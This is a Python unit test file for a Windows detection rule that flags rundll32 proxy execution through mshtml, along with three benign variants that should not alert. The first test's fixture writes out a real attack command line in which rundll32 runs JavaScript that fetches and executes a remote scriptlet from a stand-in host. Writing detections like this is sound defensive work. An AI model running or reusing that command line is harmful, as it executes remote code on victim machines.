import unittest

from backend.detection import run_detections
from tests.helpers import event


class Rundll32DetectionTests(unittest.TestCase):
    def test_mshtml_javascript_proxy_execution_is_high(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='rundll32.exe',
                command_line=(
                    'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";'
                    'document.write();GetObject("script:https://example.invalid/a.sct")'
                ),
            )
        ])

        self.assertTrue(
            any(
                alert.rule_id == 'DET-WIN-008'
                and alert.severity == 'high'
                and alert.technique == 'T1218.011'
                for alert in alerts
            )
        )

    def test_normal_rundll32_dll_entrypoint_does_not_alert(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='rundll32.exe',
                command_line='rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl',
            )
        ])

        self.assertFalse(any(alert.rule_id == 'DET-WIN-008' for alert in alerts))

    def test_javascript_without_mshtml_entrypoint_does_not_alert(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='rundll32.exe',
                command_line='rundll32.exe example.dll,EntryPoint javascript:diagnostic',
            )
        ])

        self.assertFalse(any(alert.rule_id == 'DET-WIN-008' for alert in alerts))

    def test_mshtml_entrypoint_without_javascript_does_not_alert(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='rundll32.exe',
                command_line='rundll32.exe mshtml,RunHTMLApplication',
            )
        ])

        self.assertFalse(any(alert.rule_id == 'DET-WIN-008' for alert in alerts))


if __name__ == '__main__':
    unittest.main()
